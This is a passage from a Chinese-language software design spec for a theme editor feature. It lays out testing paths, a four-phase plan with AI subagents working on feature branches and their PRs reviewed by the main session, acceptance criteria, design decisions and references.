      run: /home/fz/anaconda3/envs/sage-backend/bin/python -m pytest backend/tests/api/test_theme_router.py backend/tests/services/test_theme_storage.py -v
```

**注意:** 不允许 `--no-verify` 绕过(per `feature-branch-workflow.md` 强制)。测试挂了,subagent 必须修到 GREEN 才能 push。

### 7.7 E2E 关键路径(week 8 跨模块时再跑)

```
E2E-1: 启动 app → 默认 light 主题 → 看到亮色背景 → 切换到 'ocean' → 背景变蓝
E2E-2: 打开 CssThemeModal → 写 :root { --color-bg: #ff0000; } → 看到红屏 → 保存 → 重启 app → 仍是红色
E2E-3: 后端 mock 500 → 切换预设 → 看到 toast 但 UI 立即响应 → 修复后端 → 重新切换 → 无 toast
```

## 8. Implementation Phases(实施分阶段)

### 8.1 阶段总览

| Phase | 时长(估) | Subagent 类型 | 依赖 |
|---|---|---|---|
| P1 后端基础 | 1.5 天 | general-purpose (Python 专家) | 无 |
| P2 IPC + 注入 | 1 天 | everything-claude-code:tdd-guide (TS) | P1 |
| P3 UI 集成 | 1.5 天 | everything-claude-code:tdd-guide (React) | P2 |
| P4 5 套预设 | 0.5 天 | general-purpose (轻量) | P3 |
| **总计** | **~4.5 天** | | |

### 8.2 Subagent-Driven 调度(per phase)

每个 Phase 派一个 subagent:
1. Subagent 读取本 spec 对应章节 + 现有 codebase
2. Subagent 在 `feat/win7-theme-editor-p{N}` 分支上工作
3. Subagent 跑 RED-GREEN-IMPROVE 循环
4. Subagent commit + push + 创建 PR
5. Main session review PR(不是 subagent 自我 review)
6. CI 绿后本地 merge 到 `release/win7`(per `feature-branch-workflow.md` 的双分支策略)

### 8.3 集成时序(详细)

```
Day 1:  P1 subagent
        ├─ 建 feat/win7-theme-editor-p1 分支
        ├─ 写 backend/schemas/{theme,common}.py
        ├─ 写 backend/services/theme_storage.py + tests
        ├─ 写 backend/api/theme_router.py + tests
        ├─ 写 backend/data/themes.defaults.json (5 套预设种子)
        ├─ 跑 pytest → 全绿
        ├─ commit + push + create PR
        └─ 等待 main session review

Day 2:  P1 PR 合并后 → P2 subagent
        ├─ 切到新分支 feat/win7-theme-editor-p2 (从 release/win7 HEAD)
        ├─ 写 src/shared/types/{theme,api}.ts
        ├─ 写 src/shared/lib/theme/cssValidator.ts + tests
        ├─ 写 src/shared/api-client/themeCssClient.ts + tests
        ├─ 写 src/widgets/theme/backgroundInjector.ts + tests
        ├─ 改 electron/preload.ts + electron/main.ts
        ├─ 跑 vitest → 全绿
        ├─ commit + push + create PR
        └─ 等待 main session review

Day 3-4: P3 subagent
        ├─ 切到新分支 feat/win7-theme-editor-p3
        ├─ 写 src/widgets/theme/ThemeProvider.tsx + tests
        ├─ 写 src/widgets/theme/ThemeSelector.tsx + tests
        ├─ 写 src/widgets/theme/CssThemeModal.tsx + tests
        ├─ 写 src/widgets/theme/CodeMirrorThemeEditor.tsx + tests (懒加载)
        ├─ 写 src/widgets/theme/ErrorBoundary.tsx
        ├─ 改 src/app/providers/AppProviders.tsx (挂载 ThemeProvider)
        ├─ 跑 vitest → 全绿
        ├─ commit + push + create PR
        └─ 等待 main session review

Day 5:  P4 subagent
        ├─ 切到新分支 feat/win7-theme-editor-p4
        ├─ cherry-pick main a6b5ba8 的 5 套预设
        ├─ 写 src/widgets/theme/presets.ts
        ├─ 写 src/widgets/theme/ThemeGallery.tsx + tests
        ├─ 改 src/shared/i18n/{zh,en}.ts (新增 17 键)
        ├─ 改 src/shared/i18n/__tests__/translations.test.ts
        ├─ 跑 vitest + 手动视觉确认
        ├─ commit + push + create PR
        └─ 等待 main session review
```

### 8.4 DoD(Definition of Done)

#### 单 phase 验收
- [ ] spec + plan 已 commit
- [ ] 模块在独立分支(`feat/win7-theme-editor-p{N}`)上 CI 绿
- [ ] 覆盖率达标(见 §7.1)
- [ ] code-review agent 通过(无 critical/high)
- [ ] 用户 review 通过
- [ ] CHANGELOG.md 已更新

#### 整体 M2 验收(week 8 之前)
- [ ] 4 个 phase PR 全部 merge 到 `release/win7` + push
- [ ] pre-push hook 通过
- [ ] pytest + vitest 总覆盖率 ≥ 80%
- [ ] 跨模块 E2E(M2 单独部分)通过
- [ ] 5 套预设视觉确认 + 主题切换响应 ≤ 16ms(60fps)

## 9. 决策记录(brainstorming session)

| 决策点 | 选择 | 备选 | 理由 |
|---|---|---|---|
| 范围/深度 | Full main parity | MVP / 最小骨架 | win7 长期对齐 main,跳过 CodeMirror 会留下技术债 |
| 预设来源 | Cherry-pick main 的 5 套 | win7 主题化命名 / 混合 | 零运营成本 + 未来跨分支 cherry-pick 零摩擦 |
| i18n 键命名空间 | 组件拆分(`theme.{gallery,editor,selector,presets}.*`) | 主题.+common 复用 / 主题.+行为 复用 | 文件拆分清晰,M1 common.* 不被污染 |
| 实施工作流 | Subagent 4-Phase 渐进式 | 单 PR 集中 / Inline 会话 | 渐进验证,失败成本低,match M1 同款工作流 |
| 后端存储 | `backend/data/themes.json` atomic JSON | SQLite / 扩展 preferences | main 同款,简单直接,git 跟踪 defaults.json |
| Frontend 状态 | localStorage 优先 + IPC 异步回填 | 后端为源 / 内存 only | 启动零白屏,本地优先(per main 模式) |
| CodeMirror | CM6 + 懒加载 | CM5 / Monaco / textarea | main 同款,bundle 拆 ~200KB initial |
| CSS 注入 | `style.setProperty()` per var | `<style>` 标签 / `replaceSync` | 细粒度,无闪屏,易测试 |
| CSS 验证 | 黑名单正则 + 16-var 白名单 + 长度限制 | 仅白名单 / 仅黑名单 | 双重防御,抵御已知 + 未知威胁 |
| ErrorBoundary | Theme 局部 ErrorBoundary | 全局 ErrorBoundary | 主题失败不影响其他模块 |

## 10. References

- 项目级 CLAUDE.md:`/home/fz/project/sage/.claude/CLAUDE.md`(双分支策略、Python 环境、测试要求)
- M1 i18n spec:`/home/fz/project/sage/docs/superpowers/specs/2026-06-28-win7-i18n-framework-design.md`
- 9 模块总览 spec:`/home/fz/project/sage/docs/superpowers/specs/2026-06-28-win7-modules-rollout-design.md`
- main 实现参考:
  - P1: `fdc6f79` (ThemeCssPayload), `fe4f906` (cssValidator), `60e84c3` (theme_storage), `39f435e` (preferences)
  - P2: `15f658d` (themeCssClient), `d11f756` (backgroundInjector), `55632ec` (ThemeProvider async)
  - P3: `989e912` (CodeMirror deps), `c91a40a` (CodeMirrorThemeEditor), `a0f4eab` (CssThemeModal), `4324f0a` (集成)
  - P4: `a6b5ba8` (5 套预设 + Gallery)
- 全局规则:
  - `/home/fz/.claude/rules/common/feature-branch-workflow.md`(强制走 feature 分支)
  - `/home/fz/.claude/rules/common/testing.md`(80% 覆盖率门槛)
  - `/home/fz/.claude/rules/common/security.md`(CSS 注入防护遵循)
  - `/home/fz/.claude/rules/common/coding-style.md`(不可变数据 + 早返回)

---

**Spec 状态:** ✅ 设计完成,待用户最终审阅后转入 writing-plans 阶段。

**下一步:** 用户 review 本 spec 文件 → 确认后调用 writing-plans skill 生成 4-phase 实施 plan。
